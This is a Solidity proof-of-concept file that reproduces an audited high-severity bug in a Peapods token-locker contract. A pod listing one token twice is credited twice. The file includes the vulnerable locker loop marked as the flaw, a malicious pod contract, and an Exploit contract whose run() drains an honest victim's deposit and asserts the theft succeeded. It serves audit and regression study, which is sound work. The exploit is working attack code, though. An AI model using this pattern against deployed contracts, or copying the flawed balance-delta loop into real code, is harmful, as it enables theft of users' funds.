// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Peapods PodUnwrapLocker — arbitrary pod double-counts one token
    (Sherlock 2025-01, H-1, finding 52746).
    SYNTHETIC, cheatcode-free. The balance-delta loop is the audited loop.
    A pod that lists the same token twice is paid that delta twice. */

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract Asset {
    string public constant symbol = "peas";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IDecentralizedIndex {
    struct IndexAssetInfo {
        address token;
    }

    struct Config {
        uint256 debondCooldown;
    }

    function getAllAssets() external view returns (IndexAssetInfo[] memory);
    function debond(uint256 amount, address[] memory, uint8[] memory) external;
    function config() external view returns (Config memory);
}

contract LegitPod is IDecentralizedIndex {
    Asset public token;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(Asset _token) {
        token = _token;
    }

    function mintShares(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function getAllAssets() external view returns (IndexAssetInfo[] memory assets) {
        assets = new IndexAssetInfo[](1);
        assets[0].token = address(token);
    }

    function debond(uint256 amount, address[] memory, uint8[] memory) external {
        token.transfer(msg.sender, amount);
    }

    function config() external pure returns (Config memory) {
        return Config({debondCooldown: 0});
    }
}

contract MaliciousPod is IDecentralizedIndex {
    Asset public token;
    address public attacker;

    constructor(Asset _token, address _attacker) {
        token = _token;
        attacker = _attacker;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function getAllAssets() external view returns (IndexAssetInfo[] memory assets) {
        assets = new IndexAssetInfo[](2);
        assets[0].token = address(token);
        assets[1].token = address(token);
    }

    function debond(uint256 amount, address[] memory, uint8[] memory) external {
        token.transferFrom(attacker, msg.sender, amount);
    }

    function config() external pure returns (Config memory) {
        return Config({debondCooldown: 0});
    }
}

contract PodUnwrapLocker {
    struct LockInfo {
        address user;
        address pod;
        address[] tokens;
        uint256[] amounts;
        uint256 unlockTime;
        bool withdrawn;
    }

    mapping(uint256 => LockInfo) internal locks;
    uint256 public currentLockId;
    address public allowedPod;

    constructor(address _allowedPod) {
        allowedPod = _allowedPod;
    }

    function debondAndLock(address _pod, uint256 _amount) external {
        require(_amount > 0, "D1");
        require(_pod != address(0), "D2");

        IERC20(_pod).transferFrom(msg.sender, address(this), _amount);

        IDecentralizedIndex _podContract = IDecentralizedIndex(_pod);
        IDecentralizedIndex.IndexAssetInfo[] memory _podTokens = _podContract.getAllAssets();
        address[] memory _tokens = new address[](_podTokens.length);
        uint256[] memory _balancesBefore = new uint256[](_tokens.length);

        for (uint256 i = 0; i < _tokens.length; i++) {
            _tokens[i] = _podTokens[i].token;
            _balancesBefore[i] = IERC20(_tokens[i]).balanceOf(address(this));
        }
        _podContract.debond(_amount, new address[](0), new uint8[](0));

        uint256[] memory _receivedAmounts = new uint256[](_tokens.length);
        for (uint256 i = 0; i < _tokens.length; i++) {
            _receivedAmounts[i] = IERC20(_tokens[i]).balanceOf(address(this)) - _balancesBefore[i]; // @> VULN: one token listed twice is credited for the same balance increase on every slot
        }

        IDecentralizedIndex.Config memory _podConfig = _podContract.config();
        uint256 _lockId = currentLockId++;
        locks[_lockId] = LockInfo({
            user: msg.sender,
            pod: _pod,
            tokens: _tokens,
            amounts: _receivedAmounts,
            unlockTime: block.timestamp + _podConfig.debondCooldown,
            withdrawn: false
        });
    }

    function withdraw(uint256 _lockId) external {
        LockInfo storage _lock = locks[_lockId];
        require(_lock.user == msg.sender, "W1");
        require(!_lock.withdrawn, "W2");
        require(block.timestamp >= _lock.unlockTime, "W3");
        _lock.withdrawn = true;
        for (uint256 i = 0; i < _lock.tokens.length; i++) {
            if (_lock.amounts[i] > 0) {
                IERC20(_lock.tokens[i]).transfer(_lock.user, _lock.amounts[i]);
            }
        }
    }

    function lockAmount(uint256 _lockId, uint256 i) external view returns (uint256) {
        return locks[_lockId].amounts[i];
    }
}

contract PodUnwrapLockerFixed {
    Asset public token;
    address public allowed;

    constructor(Asset _token, address _allowed) {
        token = _token;
        allowed = _allowed;
    }

    function debondAndLock(address _pod, uint256 _amount) external {
        require(_pod == allowed, "pod");
        IERC20(_pod).transferFrom(msg.sender, address(this), _amount);
        IDecentralizedIndex(_pod).debond(_amount, new address[](0), new uint8[](0));
    }
}

contract Victim {
    function lock(LegitPod pod, PodUnwrapLocker locker, uint256 amount) external {
        pod.approve(address(locker), amount);
        locker.debondAndLock(address(pod), amount);
    }

    function lockFixed(LegitPod pod, PodUnwrapLockerFixed locker, uint256 amount) external {
        pod.approve(address(locker), amount);
        locker.debondAndLock(address(pod), amount);
    }

    function take(PodUnwrapLocker locker, uint256 id) external {
        locker.withdraw(id);
    }
}

contract Exploit {
    Asset public token;
    LegitPod public legit;
    MaliciousPod public mal;
    PodUnwrapLocker public locker;
    Victim public victim;

    uint256 public profit;
    bool public victimPaid;

    constructor() {
        token = new Asset();
        victim = new Victim();
        legit = new LegitPod(token);
        mal = new MaliciousPod(token, address(this));
        locker = new PodUnwrapLocker(address(legit));

        token.mint(address(legit), 100e18);
        legit.mintShares(address(victim), 100e18);
        victim.lock(legit, locker, 100e18);

        token.mint(address(this), 100e18);
        token.approve(address(mal), 100e18);
    }

    function run() external {
        uint256 beforeBal = token.balanceOf(address(this));
        uint256 id = locker.currentLockId();
        locker.debondAndLock(address(mal), 100e18);
        require(locker.lockAmount(id, 0) == 100e18, "slot0");
        require(locker.lockAmount(id, 1) == 100e18, "slot1");
        locker.withdraw(id);

        (bool ok,) = address(victim).call(abi.encodeWithSelector(victim.take.selector, locker, uint256(0)));
        victimPaid = ok;

        profit = token.balanceOf(address(this)) - beforeBal;
        require(profit == 100e18, "did not steal the honest deposit");
        require(token.balanceOf(address(locker)) == 0, "locker not empty");
        require(!victimPaid, "honest lock still paid");
    }
}
